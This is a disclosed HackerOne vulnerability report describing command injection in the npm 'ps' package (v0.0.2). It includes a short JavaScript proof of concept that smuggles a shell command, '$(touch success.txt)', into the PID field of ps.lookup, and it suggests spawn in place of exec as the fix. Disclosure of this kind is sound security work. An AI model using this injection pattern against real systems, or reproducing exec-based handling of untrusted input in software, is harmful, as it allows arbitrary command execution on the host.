# Command Injection is ps Package

## Report Details
- **Report ID**: 390848
- **URL**: https://hackerone.com/reports/390848
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-08-06T10:19:15.354Z
- **Disclosed**: 2018-09-07T06:47:28.954Z

## Reporter
- **Username**: cris_semmle
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a command injection in ps package.
It allows attacker to inject arbitrary OS commands instead of PID numbers.

# Module

**module name:** ps
**version:** 0.0.2
**npm page:** `https://www.npmjs.com/package/ps`

## Module Description

A Node.js module for looking up running processes.

## Module Stats

39 downloads in the last week

# Vulnerability

## Vulnerability Description

The ps package expects a valid PID number, but an attacker can inject arbitrary commands instead.

## Steps To Reproduce:
```js
var ps = require('ps');

ps.lookup({ pid: "$(touch success.txt)" }, function(err, proc) { // this method is vulnerable to command injection
    if (err) {throw err;}
    if (proc) {
        console.log(proc);  // Process name, something like "node" or "bash"
    } else {
        console.log('No such process');
    }
});
```

## Patch

N/A replace exec with spawn

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

If the attacker can control the PID, she can inject arbitrary OS commands.

## Attachments
No attachments
